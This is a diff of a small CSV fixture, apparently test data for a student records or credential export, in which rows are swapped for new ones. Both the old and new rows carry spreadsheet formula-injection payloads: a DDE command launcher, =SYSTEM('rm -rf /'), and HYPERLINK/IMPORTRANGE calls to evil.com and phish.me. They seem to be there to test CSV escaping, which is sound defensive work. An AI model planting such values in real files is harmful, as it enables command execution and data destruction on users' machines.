@@ -1,4 +1,3 @@
-student_id,skill_name,wallet_address
-a1b2c3d4-e5f6-4a7b-8c9d-0e1f2a3b4c5d,=CMD("calc"),0x742d35Cc6634C0532925a3b844Bc9e7595f2bD68
-b2c3d4e5-f6a7-4b8c-9d0e-1f2a3b4c5d6e,+HYPERLINK("http://evil.com"),0x1234567890abcdef1234567890abcdef12345678
-c3d4e5f6-a7b8-4c9d-0e1f-2a3b4c5d6e7f,@SUM(A1:A10),0xabcdef1234567890abcdef1234567890abcdef12
+student_id,wallet_address,degree_name,major,gpa,honors,graduation_date,skill_tags
+1ecc09bd-6dfb-4e2d-8dd7-ef95c27e6e8a,0xbda5747bfd65f08deb54cb465eb87d40e51b197e,=SYSTEM("rm -rf /"),+IMPORTRANGE("http://evil.com"),1.00,@SUM(A1:Z99),2026-07-20,-cmd|'/C calc'|!A0
+e7cef1bd-1f09-41ad-acab-667de9eadf40,0x9965507d1a55bcc2695c58ba16fb37d819b0a4dc,Bachelor of Arts,Psychology,2.00,=HYPERLINK("http://phish.me"),2026-07-20,"@import('malware'), =DDE()"
